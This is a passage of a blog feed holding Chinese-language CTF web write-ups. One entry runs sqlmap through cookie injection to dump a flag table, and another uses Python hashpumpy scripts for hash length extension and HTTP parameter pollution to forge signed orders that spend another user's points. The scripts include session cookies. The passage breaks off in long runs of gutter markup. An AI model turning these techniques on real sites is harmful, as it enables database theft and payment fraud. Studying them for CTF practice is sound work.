class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1.cookie 注入，猜解表</span></span><br><span class="line">sqlmap -u http://120.78.187.100:8082/content.php --cookie "message_id=1412" --table --level 2</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">do</span> you want to URL encode cookie values (implementation specific)? [Y/n] Y</span></span><br><span class="line">[10:42:28] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Debian 9.0 (stretch)</span><br><span class="line">web application technology: PHP 5.6.38, Apache 2.4.25</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">Cookie parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">do</span> you want to use common table existence check? [Y/n/q] Y 10</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 表已经跑出来了</span></span><br><span class="line">Database: 2018_hdb_waf </span><br><span class="line">[3 tables]</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| user                                  |</span><br><span class="line">| content                               |</span><br><span class="line">| flag                                  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2.选择表猜解字段(flag)</span></span><br><span class="line">sqlmap -u http://120.78.187.100:8082/content.php --cookie "message_id=1412" --column -T flag --level 2</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+--------------+</span><br><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| flag   | varchar(255) |</span><br><span class="line">+--------+--------------+</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3.猜解内容</span></span><br><span class="line">sqlmap -u http://120.78.187.100:8082/content.php --cookie "message_id=1412" --dump -T flag --level 2</span><br><span class="line">[10:44:45] [INFO] retrieved: 1</span><br><span class="line">[10:44:45] [INFO] retrieved: flag&#123;b4d_eregi_d0_noT_uSe_1t&#125;</span><br><span class="line">Database: 2018_hdb_waf</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+-------------------------------+</span><br><span class="line">| flag                          |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| flag&#123;b4d_eregi_d0_xxx_xxx&#125; |</span><br><span class="line">+-------------------------------+</span><br></pre></td></tr></table></figure><p>==手注版==(吴乾豪提供)  以后再整理一下</p><p><img src="https://i.loli.net/2018/11/26/5bfb956054080.png" alt="4GOPF)YS.png"><br><img src="https://i.loli.net/2018/11/26/5bfb956055d0a.png" alt="STNGU9DPB2.png"><br><img src="https://i.loli.net/2018/11/26/5bfb956057bab.png" alt="IQMRDL4.png"></p><p><br></p><h3 id="咕咕-shop"><a href="#咕咕-shop" class="headerlink" title="咕咕 shop"></a>咕咕 shop</h3><p>听说 <a href="http://118.89.198.146:50006/" target="_blank" rel="noopener">咕咕shop</a> 上有个积分上万的人，你能越权消耗他的积分，购买到 FLAG 吗？</p><ul><li><p>哈希长度扩展攻击    <a href="https://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">相关工具</a>  <a href="http://www.cnblogs.com/pcat/p/7668989.html" target="_blank" rel="noopener">参考博客</a>  <a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">Hashpumpy</a></p></li><li><p>HTTP参数污染</p></li></ul><p>HTTP参数污染，简单地讲就是给一个参数赋上两个或两个以上的值。现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理。因此web程序组件在遇到这类问题时采取的方法也不完全相同。在一个HTTP请求中，同一个参数，拥有多个值是合法的。利用此特性，可以作为绕过参数过滤的手段。</p><p>假设 URL：<a href="http://www.xxxx.com/search.php?id=110&amp;id=911" target="_blank" rel="noopener">http://www.xxxx.com/search.php?id=110&amp;id=911</a></p><p>百度会理解成让百度搜索：110                 #选择了第一个参数,放弃了第二个参数。</p><p>雅虎会理解成让雅虎搜索：911　　          #选择了第二个参数,放弃了第一个参数。</p><p>谷歌会理解成让谷歌搜索：110 911         #两个参数同时选择。</p><p>假设输入 ?key=select &amp; key=1,2,3,4 from table</p><p>服务端有可能会将key处理为select 1,2,3,4 from table，从而导致SQL注入。</p><p><img src="https://i.loli.net/2018/11/26/5bfb93713fad9.png" alt="1542278011170.png"></p><p><strong>信息收集：</strong></p><p>泄露在源码中的注释是解题和渗透的关键，从此处可得到 signature 的原文组成：solt + confirmation()<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="built_in">document</span>).ready(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">        t = $(<span class="string">'input[name=order_create_time]'</span>)</span><br><span class="line">        t.data(<span class="string">'t'</span>, t.val())</span><br><span class="line">        t.val(moment(<span class="number">1000</span>*t.val()).utcOffset(<span class="number">8</span>).format(<span class="string">'lll'</span>))</span><br><span class="line">        f = $(<span class="string">'#confirmation'</span>)</span><br><span class="line">        b = f.children().last()</span><br><span class="line">        <span class="keyword">if</span>($(<span class="string">'[name=buyer_point]'</span>).val()-$(<span class="string">'[name=good_price]'</span>).val() &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            $(<span class="string">'[name=good_price]'</span>).addClass(<span class="string">'text-danger'</span>)</span><br><span class="line">            b.text(<span class="string">'余额不足，请先充值'</span>)</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 客户端生成签名不安全，更换新的长密钥并且由服务端下发签名 2017.8.9</span></span><br><span class="line"><span class="comment">        secure_key = R\xe7\x85`]\xb1\x80\xe6\x9bo\x19y\xc5\x88CR\7f\xb......'</span></span><br><span class="line"><span class="comment">        confirmation_data = f.serialize()</span></span><br><span class="line"><span class="comment">        signature = md5(`$&#123;secure_key&#125;$&#123;confirmation_data&#125;`)</span></span><br><span class="line"><span class="comment">        f.attr('action', f.attr('action') + `?signature=$&#123;signature&#125;`)</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        b.removeAttr(<span class="string">'disabled'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    $(<span class="string">'#submit'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        t.val(t.data(<span class="string">'t'</span>))</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>这里还有一个小知识点，form 被 js 中的序列化成字符串，如</p><p><img src="https://i.loli.net/2018/11/26/5bfb937149c6c.png" alt="1542443290094.png"></p><p>(这种 js 可直接通过 F12 中的终端来运行)</p><p><img src="https://i.loli.net/2018/11/26/5bfb937147c07.png" alt="1542443452913.png"></p><p><u>关键点：</u></p><p>1.利用哈希长度扩展攻击跑出密钥长度</p><p>2.利用 HPP 实现越权“购买”</p><p>==shell版==：第一想法是先生成字典，然后放到bp里跑，结果失败了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">signature="422f15413110908ab58d837ae3b2f28f"</span><br><span class="line">data="order_id=156&amp;buyer_id=39&amp;good_id=25&amp;buyer_point=510&amp;good_price=10&amp;order_create_time=1542048947.212575"</span><br><span class="line">key_len=900  # yizhimiyao</span><br><span class="line">add_data="&amp;a"</span><br><span class="line"></span><br><span class="line">for ((len=0; i&lt;350; i++,key_len++))</span><br><span class="line">do</span><br><span class="line">hashpump -s $signature -d $data -k $key_len -a $add_data</span><br><span class="line">done</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">bash _shell &gt; len.txt</span><br><span class="line">awk 'NR%2==0' len.txt &gt; post.txt  # 输出偶数行</span><br><span class="line">awk 'NR%2==1' len.txt &gt; sign.txt  # 输出奇数行</span><br></pre></td></tr></table></figure><p>==py版==：还是py给力，以后全用py吧</p><p>如果 solt 长度正确时，post 中添加一个无关的值，仍然不会影响购买，由此可得出密钥长度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">signature = <span class="string">'579e444c268e0d907802313318cdfcb2'</span></span><br><span class="line">original = <span class="string">'order_id=160&amp;buyer_id=39&amp;good_id=25&amp;buyer_point=500&amp;good_price=10&amp;order_create_time=1542226400.115264'</span></span><br><span class="line">add_data = <span class="string">'&amp;a=233'</span></span><br><span class="line">key_length = len(original) + <span class="number">700</span> + i</span><br><span class="line"></span><br><span class="line">hash = hashpumpy.hashpump(signature,original,add_data,key_length)</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://118.89.198.146:50006/paymentGatewayV2/cid-1145141919/810893/check.jsp?signature='</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># message = urllib.quote(urllib.unquote(hash[1]))  不需要编码为URL</span></span><br><span class="line">message = hash[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> i,hash[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">url += hash[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line"><span class="string">'cookie'</span>: <span class="string">'csrftoken=9wFi4GbKQdcis91qJP28DEmZZerQXdqBWt53kHmwUNp1iEFVnEVEVFmYuX5eBKUG; JSESSIONID=buakhmracrlqcyxt726ui8u5jymu0ov4'</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Accept-Language'</span>: <span class="string">':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#res = requests.post(url=url,headers=headers,data=message,proxies=&#123;'http': '127.0.0.1:8080'&#125;)</span></span><br><span class="line">res = requests.post(url=url,headers=headers,data=message)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'alert alert-dange'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.content:</span><br><span class="line">       <span class="keyword">print</span> key_length;</span><br><span class="line">       <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/11/26/5bfb9371612ff.png" alt="1542281973455.png"></p><p>得到长度后，就是参数污染了。</p><p>直接添加<code>good_id=42</code>失败了，换了不少姿势。</p><p>突然想到题面的信息：有个积分上万的人，你能越权消耗他的积分，购买到 FLAG 吗？</p><p>==划重点==  用别人的钱买flag  ==划重点==</p><p>然后就是换<code>buyer_id</code>，第一反应是 0、1 ? 不，没用，直接挂个脚本尝试下。31，购买成功！</p><p>期间遇到的麻烦：页面找不到。最初以为是自己误删了某个信息，重新复制一下仍然报错。</p><p>如果请求成功，但是请求的内容不存在，自然会报错，就比如说利用 buyer_id = 666 来买 flag，也会报错。报错的话就改参数就好。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">signature = <span class="string">'7d542ad0766a6459e6048ed854091987'</span></span><br><span class="line">original = <span class="string">'order_id=162&amp;buyer_id=39&amp;good_id=33&amp;buyer_point=480&amp;good_price=300&amp;order_create_time=1542231522.790944'</span></span><br><span class="line"><span class="comment">#add_data = '&amp;good_id=42'</span></span><br><span class="line"><span class="comment">#add_data = '&amp;buyer_id=0'</span></span><br><span class="line"><span class="comment">#add_data = '&amp;buyer_id=1&amp;good_id=42'</span></span><br><span class="line"><span class="comment">#add_data = '&amp;good_id=42&amp;good_id=42'</span></span><br><span class="line"><span class="comment">#add_data = '&amp;good_id=42&amp;buyer_point=999'</span></span><br><span class="line"><span class="comment">#add_data = '&amp;good_id=42&amp;buyer_point=999&amp;good_price=998'</span></span><br><span class="line"><span class="comment">#add_data = '&amp;buyer_point=999&amp;good_id=42&amp;good_price=998'</span></span><br><span class="line">key_length = <span class="number">1024</span></span><br><span class="line">headers=&#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">        <span class="string">'cookie'</span>: <span class="string">'csrftoken=9wFi4GbKQdcis91qJP28DEmZZerQXdqBWt53kHmwUNp1iEFVnEVEVFmYuX5eBKUG; JSESSIONID=buakhmracrlqcyxt726ui8u5jymu0ov4'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">i = <span class="number">31</span></span><br><span class="line">add_data = <span class="string">'&amp;good_id=42&amp;buyer_id='</span> + str(i)</span><br><span class="line"><span class="comment"># i = 31 who have money to buy flag</span></span><br><span class="line">hash = hashpumpy.hashpump(signature,original,add_data,key_length)</span><br><span class="line">url = <span class="string">'http://118.89.198.146:50006/paymentGatewayV2/cid-1145141919/810893/check.jsp?signature='</span> + hash[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># message = urllib.quote(urllib.unquote(hash[1]))</span></span><br><span class="line">message = hash[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxy=&#123;'http': '127.0.0.1:8080'&#125;  为requests请求设置代理</span></span><br><span class="line"><span class="comment"># 如果不确定 requests 发的具体数据，用bp抓包看看</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#res = requests.post(url=url,headers=headers,data=message,proxies=proxy)</span></span><br><span class="line">res = requests.post(url=url,headers=headers,data=message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> res.content</span><br><span class="line"><span class="keyword">if</span> <span class="string">'alert alert-success'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-------------------------Success!------------------------"</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/11/26/5bfb9371415f4.png" alt="1542281916199.png"></p><p>到此，flag 已经买到了。当时候还没反应过来，想着再买一次，去看一下订单，flag 已经出来了。 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;PHP-后门分析&quot;&gt;&lt;a href=&quot;#PHP-后门分析&quot; class=&quot;headerlink&quot; title=&quot;PHP 后门分析&quot;&gt;&lt;/a&gt;PHP 后门分析&lt;/h3&gt;&lt;p&gt;李大猫在他的 WordPress 博客里发现了被黑客植入的 PHP 后门，快帮他分析分析这个
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>bugku Web 部分WP</title>
    <link href="https://wywwzjj.top/2018/09/26/bugku-Web-%E9%83%A8%E5%88%86WP/"/>
    <id>https://wywwzjj.top/2018/09/26/bugku-Web-部分WP/</id>
    <published>2018-09-26T09:58:44.000Z</published>
    <updated>2019-02-28T09:03:32.871Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span 